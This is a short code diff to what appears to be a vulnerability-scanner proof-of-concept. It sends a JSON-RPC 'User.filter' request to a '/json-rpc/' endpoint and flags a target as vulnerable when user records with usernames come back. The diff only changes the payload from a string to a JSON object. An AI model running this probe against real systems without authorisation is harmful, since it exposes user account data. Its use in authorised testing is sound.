@@ -39,9 +39,9 @@ def poc(url):
 
         path = """/json-rpc/"""
         method = "POST"
-        data = """{"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}"""
+        data = {"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":True}}}
         headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip, deflate'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if (resp0.status_code == 200) and ("""result""" in resp0.text and """username""" in resp0.text and """jsonrpc""" in resp0.text and """is_active""" in resp0.text):
             result["success"] = True
